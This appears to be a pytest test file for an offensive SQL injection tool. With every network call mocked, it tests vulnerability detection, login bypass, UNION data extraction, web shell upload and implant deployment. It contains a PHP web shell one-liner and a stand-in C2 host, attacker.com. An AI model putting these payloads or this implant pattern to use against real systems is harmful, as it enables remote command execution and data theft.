"""
Unit tests for SQL Injection Exploit module.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock, mock_open
import requests
from initial_access.sqli_exploit import SQLiExploit


class TestSQLiExploit:
    """Test SQLiExploit class."""

    def test_initialization(self):
        """Test SQLiExploit initialization."""
        exploit = SQLiExploit('http://target.com', verify_ssl=True)

        assert exploit.target_url == 'http://target.com'
        assert exploit.verify_ssl is True
        assert exploit.session is not None

    def test_default_ssl_verification(self):
        """Test default SSL verification is False."""
        exploit = SQLiExploit('http://target.com')

        assert exploit.verify_ssl is False

    def test_payloads_defined(self):
        """Test that payloads are defined."""
        assert len(SQLiExploit.AUTH_BYPASS_PAYLOADS) > 0
        assert len(SQLiExploit.UNION_PAYLOADS) > 0

    def test_user_agent_set(self):
        """Test that user agent is set."""
        exploit = SQLiExploit('http://target.com')

        assert 'User-Agent' in exploit.session.headers
        assert 'Mozilla' in exploit.session.headers['User-Agent']

    @patch('requests.Session.get')
    def test_vulnerability_detection_success(self, mock_get):
        """Test successful vulnerability detection."""
        exploit = SQLiExploit('http://target.com')

        # Mock response with SQL error
        mock_response = Mock()
        mock_response.text = "MySQL syntax error in your SQL query"
        mock_get.return_value = mock_response

        is_vuln = exploit.test_vulnerability('/page', 'id', 'GET')

        assert is_vuln is True

    @patch('requests.Session.get')
    def test_vulnerability_detection_no_vuln(self, mock_get):
        """Test when no vulnerability exists."""
        exploit = SQLiExploit('http://target.com')

        # Mock normal response
        mock_response = Mock()
        mock_response.text = "Normal page content"
        mock_get.return_value = mock_response

        is_vuln = exploit.test_vulnerability('/page', 'id', 'GET')

        assert is_vuln is False

    @patch('requests.Session.post')
    def test_vulnerability_detection_post(self, mock_post):
        """Test vulnerability detection with POST method."""
        exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.text = "PostgreSQL ERROR: syntax"
        mock_post.return_value = mock_response

        is_vuln = exploit.test_vulnerability('/login', 'username', 'POST')

        assert is_vuln is True
        mock_post.assert_called()

    @patch('requests.Session.post')
    def test_auth_bypass_success(self, mock_post):
        """Test successful authentication bypass."""
        exploit = SQLiExploit('http://target.com')

        # Mock successful login response
        mock_response = Mock()
        mock_response.status_code = 302
        mock_response.text = "Dashboard"
        mock_response.headers = {'Set-Cookie': 'session=abc123'}
        mock_post.return_value = mock_response

        result = exploit.auth_bypass('/login')

        assert result is not None
        assert result.status_code == 302

    @patch('requests.Session.post')
    def test_auth_bypass_failure(self, mock_post):
        """Test failed authentication bypass."""
        exploit = SQLiExploit('http://target.com')

        # Mock failed login response
        mock_response = Mock()
        mock_response.status_code = 401
        mock_response.text = "Login failed"
        mock_post.return_value = mock_response

        result = exploit.auth_bypass('/login')

        assert result is None

    @patch('requests.Session.post')
    def test_auth_bypass_custom_fields(self, mock_post):
        """Test authentication bypass with custom field names."""
        exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.text = "welcome"
        mock_post.return_value = mock_response

        result = exploit.auth_bypass(
            '/login',
            username_field='user',
            password_field='pass'
        )

        # Verify custom field names were used
        call_args = mock_post.call_args
        assert 'user' in call_args[1]['data']
        assert 'pass' in call_args[1]['data']

    @patch.object(SQLiExploit, '_find_column_count')
    @patch('requests.Session.get')
    def test_extract_data_success(self, mock_get, mock_find_cols):
        """Test successful data extraction."""
        exploit = SQLiExploit('http://target.com')

        # Mock column count finding
        mock_find_cols.return_value = 3

        # Mock data extraction response
        mock_response = Mock()
        mock_response.text = "<td>admin</td><td>user1</td><td>user2</td>"
        mock_get.return_value = mock_response

        data = exploit.extract_data('/page', 'id', 'users', 'username', 'GET')

        assert data is not None
        assert len(data) == 3
        assert 'admin' in data

    @patch.object(SQLiExploit, '_find_column_count')
    def test_extract_data_no_columns(self, mock_find_cols):
        """Test data extraction when column count not found."""
        exploit = SQLiExploit('http://target.com')

        mock_find_cols.return_value = None

        data = exploit.extract_data('/page', 'id', 'users', 'username')

        assert data is None

    @patch('requests.Session.get')
    def test_find_column_count(self, mock_get):
        """Test finding column count with ORDER BY technique."""
        exploit = SQLiExploit('http://target.com')

        # Mock responses - success for 1-3 columns, error for 4
        responses = [
            Mock(text="Normal response"),  # 1 column
            Mock(text="Normal response"),  # 2 columns
            Mock(text="Normal response"),  # 3 columns
            Mock(text="Unknown column '4' ORDER BY"),  # 4 columns - error
        ]
        mock_get.side_effect = responses

        columns = exploit._find_column_count('http://target.com/page', 'id', 'GET')

        assert columns == 3

    @patch('requests.Session.get')
    def test_upload_shell(self, mock_get):
        """Test web shell upload."""
        exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.status_code = 200
        mock_get.return_value = mock_response

        result = exploit.upload_shell(
            '/page',
            'id',
            '<?php system($_GET["cmd"]); ?>',
            '/var/www/shell.php'
        )

        assert result is True

    @patch('requests.Session.get')
    def test_upload_shell_failure(self, mock_get):
        """Test web shell upload failure."""
        exploit = SQLiExploit('http://target.com')

        mock_response = Mock()
        mock_response.status_code = 500
        mock_get.return_value = mock_response

        result = exploit.upload_shell('/page', 'id', 'shell_code', '/tmp/shell.php')

        assert result is False

    @patch('builtins.open', new_callable=mock_open,
           read_data='# Implant code\nC2_URL = "http://127.0.0.1:8443"')
    @patch.object(SQLiExploit, 'upload_shell')
    def test_deploy_implant_success(self, mock_upload, mock_file):
        """Test successful implant deployment."""
        exploit = SQLiExploit('http://target.com')

        mock_upload.return_value = True

        result = exploit.deploy_implant(
            '/page',
            'id',
            'http://attacker.com:8443'
        )

        assert result is True
        mock_upload.assert_called_once()

        # Verify C2 URL was replaced
        call_args = mock_upload.call_args[0]
        implant_code = call_args[2]
        assert 'http://attacker.com:8443' in implant_code

    @patch('builtins.open', side_effect=FileNotFoundError())
    def test_deploy_implant_no_file(self, mock_file):
        """Test implant deployment when file not found."""
        exploit = SQLiExploit('http://target.com')

        result = exploit.deploy_implant('/page', 'id', 'http://c2.com')

        assert result is False

    @patch('requests.Session.get')
    def test_exception_handling(self, mock_get):
        """Test exception handling in test_vulnerability."""
        exploit = SQLiExploit('http://target.com')

        mock_get.side_effect = Exception("Network error")

        # Should handle exception and return False
        is_vuln = exploit.test_vulnerability('/page', 'id')

        assert is_vuln is False

    @patch('requests.Session.post')
    def test_auth_bypass_timeout(self, mock_post):
        """Test authentication bypass with timeout."""
        exploit = SQLiExploit('http://target.com')

        mock_post.side_effect = requests.exceptions.Timeout()

        result = exploit.auth_bypass('/login')

        assert result is None


class TestSQLiExploitPayloads:
    """Test SQL injection payloads."""

    def test_auth_bypass_payloads_present(self):
        """Test that authentication bypass payloads are present."""
        payloads = SQLiExploit.AUTH_BYPASS_PAYLOADS

        assert len(payloads) > 0
        assert any("OR '1'='1'" in p for p in payloads)
        assert any("admin" in p for p in payloads)

    def test_union_payloads_present(self):
        """Test that UNION payloads are present."""
        payloads = SQLiExploit.UNION_PAYLOADS

        assert len(payloads) > 0
        assert any("UNION SELECT" in p for p in payloads)
        assert any("NULL" in p for p in payloads)


class TestSQLiExploitIntegration:
    """Integration tests for SQL injection exploit."""

    @patch('requests.Session.post')
    def test_full_auth_bypass_flow(self, mock_post):
        """Test full authentication bypass flow."""
        exploit = SQLiExploit('http://target.com')

        # Simulate multiple attempts with final success
        responses = [
            Mock(status_code=401, text="Failed"),
            Mock(status_code=401, text="Failed"),
            Mock(status_code=302, text="dashboard", headers={'Set-Cookie': 'session=abc'}),
        ]
        mock_post.side_effect = responses

        result = exploit.auth_bypass('/login')

        assert result is not None
        assert result.status_code == 302

    @patch('requests.Session.get')
    @patch.object(SQLiExploit, '_find_column_count')
    def test_full_data_extraction_flow(self, mock_find_cols, mock_get):
        """Test full data extraction flow."""
        exploit = SQLiExploit('http://target.com')

        mock_find_cols.return_value = 3

        mock_response = Mock()
        mock_response.text = """
            <table>
                <tr><td>admin</td><td>user1</td></tr>
                <tr><td>user2</td><td>user3</td></tr>
            </table>
        """
        mock_get.return_value = mock_response

        data = exploit.extract_data('/users', 'id', 'users', 'username')

        assert data is not None
        assert len(data) >= 2


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
